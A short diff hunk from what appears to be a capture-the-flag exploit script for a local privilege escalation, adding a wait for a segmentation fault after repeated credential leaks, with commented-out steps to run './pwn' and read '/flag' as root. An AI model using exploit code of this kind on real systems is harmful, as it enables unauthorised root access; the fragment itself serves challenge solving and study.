@@ -56,6 +56,8 @@ sp( 'chmod +x ./pwn' )
 for _ in range(3):
     leak()
 
+y.recvuntil( 'Segmentation fault\r\n' )
+
 #sp( './pwn' ) # cred should be the same as first leak
 
 #y.sendlineafter( '/tmp #' , 'cat /flag' ) # root !
